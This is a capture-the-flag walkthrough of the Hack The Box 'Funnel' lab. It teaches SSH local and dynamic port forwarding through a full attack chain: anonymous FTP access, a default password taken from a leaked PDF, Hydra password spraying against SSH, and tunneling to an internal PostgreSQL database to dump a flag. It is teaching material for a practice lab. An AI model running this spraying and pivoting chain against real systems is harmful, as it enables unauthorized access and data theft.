# 🧪 Hack The Box - Funnel Walkthrough  
**Module**: Tunneling / Port Forwarding  
**Author(s)**: amra, C4rm3l0  
**Focus**: SSH Tunneling, PostgreSQL Enumeration, FTP Enumeration, Password Spraying  
**Difficulty**: Intermediate  
---

## 🧠 Introduction - What Is Tunneling?

In secure environments, services like **databases**, **Redis**, or **internal dev apps** are **only exposed on internal interfaces (localhost)**. That means: even if you scan from the outside, you won’t see them. But if an attacker gets access to a system inside the network, **they can access those "hidden" services via SSH tunnels**.

### 💡 What Is a Tunnel?

- **Tunneling** = Encapsulating one protocol inside another, to get through restricted networks.
- In SSH, tunneling allows us to **forward ports** through the encrypted SSH session.
- That means we can use **local tools** to interact with **remote services** that aren't normally reachable.

### 🔒 Types of SSH Tunneling

| Type               | Description                                                                 |
|--------------------|-----------------------------------------------------------------------------|
| **Local Forwarding**   | Redirect traffic from local machine → remote service via SSH               |
| **Remote Forwarding**  | Redirect traffic from remote machine → local service via SSH               |
| **Dynamic Forwarding** | Set up a SOCKS proxy, dynamically send traffic to any target via SSH tunnel |

---

## 🔍 Reconnaissance with Nmap

```bash
nmap -sV -sC 10.129.X.X
```

### 🔎 Results:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.x
```

FTP is potentially open for anonymous access. SSH is up and may be bruteforceable.

---

## 📁 FTP Enumeration - Gaining Initial Intel

### 👇 Connect to FTP Anonymously:

```bash
ftp 10.129.X.X
Name: anonymous
Password: [just press Enter]
```

✅ Response: `230 Login successful`  
Boom! We're in.

---

### 🗂️ Explore the Directories

```bash
dir          # list files
cd mail_backup
dir          # list contents inside
```

🧾 Files Discovered:

- `welcome_28112022`
- `password_policy.pdf`

---

### ⬇️ Download the Files

```bash
get welcome_28112022
get password_policy.pdf
exit
```

---

### 📖 Review Downloaded Files

```bash
cat welcome_28112022
```

- Reveals email content.
- 🧠 **Extract usernames** from email list (e.g., `alice@funnel.htb` → `alice`)

📄 View the PDF:
- Use GUI viewer or open file manager:
```bash
open .
```

🧠 It reveals default password: `funnel123#!#`

---

## 🔑 SSH Brute-force (Password Spraying) with Hydra

💥 Let's attempt **password spraying** on SSH using:

- A list of usernames (`usernames.txt`)
- The known password `funnel123#!#`

```bash
hydra -L usernames.txt -p 'funnel123#!#' ssh://10.129.X.X
```

✅ Found credentials:  
**christine : funnel123#!#**

---

## 🐚 SSH Login - Gaining Foothold

```bash
ssh christine@10.129.X.X
```

🧠 We're in as user `christine`.

---

## 🛠️ Local Port Enumeration with `ss`

Now we enumerate **internal services** that weren't exposed to Nmap.

```bash
ss -tln
```

Explanation:

| Flag | Meaning                    |
|------|----------------------------|
| -t   | TCP sockets only           |
| -l   | Only listening sockets     |
| -n   | Don’t resolve port names   |

### 📍 Found:

- `127.0.0.1:5432` → Postgres running **locally only** — not accessible remotely

---

## 🧠 Problem: No `psql` on Target

Running:

```bash
psql
```

❌ Not found.

🧠 We can’t interact with Postgres *on the remote machine*. But we **can** use SSH tunneling to bring the service to our own machine.

---

## 🔄 Local Port Forwarding - Accessing Postgres via Tunnel

### 🔁 Create SSH Tunnel:

```bash
ssh -L 1234:localhost:5432 christine@10.129.X.X
```

Explanation:

- `-L`: local port forwarding
- `1234`: local port to listen on
- `localhost:5432`: destination on remote server (Postgres)
- `christine@...`: SSH user and host

✅ Now, port `1234` on our local machine is connected to `5432` on the target.

---

## 🧰 Install `psql` Locally

```bash
sudo apt update && sudo apt install postgresql-client
```

---

## 🧑‍💻 Connect to Remote Postgres via Tunnel

```bash
psql -U christine -h localhost -p 1234
```

🧠 PostgreSQL prompts for password. Try:  
`funnel123#!#`

✅ Connected!

---

## 🧬 PostgreSQL Enumeration

### 📜 List Databases

```sql
\l
```

Found:  
- `secrets`

### 🔄 Connect to the `secrets` DB

```sql
\c secrets
```

### 📂 List Tables

```sql
\dt
```

Found:  
- `flag`

### 📥 Dump Flag Table

```sql
SELECT * FROM flag;
```

🎯 **Flag Acquired!** Mission accomplished!

---

## ⚙️ [Optional] Dynamic Port Forwarding (SOCKS5 Proxy)

### 🔁 Start Tunnel:

```bash
ssh -D 1234 christine@10.129.X.X
```

- `-D 1234`: start SOCKS proxy on local port 1234

🧠 Now our local port 1234 acts as a SOCKS5 proxy — all traffic sent through it gets forwarded through the SSH session!

---

## 🔗 Use `proxychains` with SOCKS Tunnel

### 🔧 Configure `/etc/proxychains4.conf`

```ini
strict_chain
# dynamic_chain
# random_chain

[ProxyList]
socks5 127.0.0.1 1234
```

### 📡 Run Commands Through the Proxy

```bash
proxychains psql -U christine -h localhost -p 5432
```

🎯 Success — you can now tunnel **any traffic** (cURL, nmap, browsers) via the SOCKS proxy.

---

## 🏁 Summary

| Step | Action                                                   |
|------|----------------------------------------------------------|
| 1️⃣   | Scanned target and found FTP + SSH                      |
| 2️⃣   | Logged in anonymously to FTP                            |
| 3️⃣   | Extracted usernames + default password from files       |
| 4️⃣   | Used Hydra to password spray SSH                        |
| 5️⃣   | Logged in as `christine`                                |
| 6️⃣   | Discovered Postgres on `localhost:5432`                 |
| 7️⃣   | Forwarded port via SSH: `-L 1234:localhost:5432`        |
| 8️⃣   | Connected to Postgres from local machine using `psql`   |
| 9️⃣   | Enumerated databases → dumped the flag table            |

---

✅ **Lessons Learned**:

- Tunneling is a powerful way to reach internal services
- SSH tunnels are secure, encrypted, and versatile
- Even restricted environments can leak sensitive data if one foothold is gained

🔥 Stay stealthy. Stay sharp. Tunnel your way to root.
